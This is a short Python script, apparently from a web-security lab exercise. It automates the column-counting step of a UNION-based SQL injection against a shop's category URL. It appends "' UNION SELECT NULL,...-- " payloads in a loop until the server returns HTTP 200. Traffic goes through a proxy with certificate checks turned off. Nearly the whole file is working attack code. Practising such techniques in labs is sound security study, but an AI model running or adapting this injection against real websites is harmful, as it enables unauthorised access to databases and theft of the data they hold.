import sys
import logging
import urllib3
import requests

import utils
from shop import Shop

log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}] [{levelname}] [{name}] {message}",
    style="{", 
    datefmt="%H:%M:%S",
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def determine_number_of_columns(url, no_proxy):
    log.info("Determining number of columns")
    nulls_list=["NULL"]
    num_columns = None
    while len(nulls_list) < 10:
        nulls = ",".join(nulls_list)
        category = f"' UNION SELECT {nulls}-- "
        exploit_url = url + category
        if no_proxy: 
            resp = requests.get(exploit_url)
        else: 
            resp = requests.get(exploit_url, proxies=utils.PROXIES, verify=False)
        if resp.status_code == 200:
            num_columns = len(nulls_list)
            break
        nulls_list.append("NULL")
    if num_columns:
        log.info(f"number of columns if: {num_columns}")
    return num_columns





def main(args):
    shop = Shop(args.url, args.no_proxy)
    num_columns = determine_number_of_columns(shop.category_url, shop.no_proxy)
    
if __name__ == "__main__":
    args=utils.parse_args(sys.argv)
    main(args)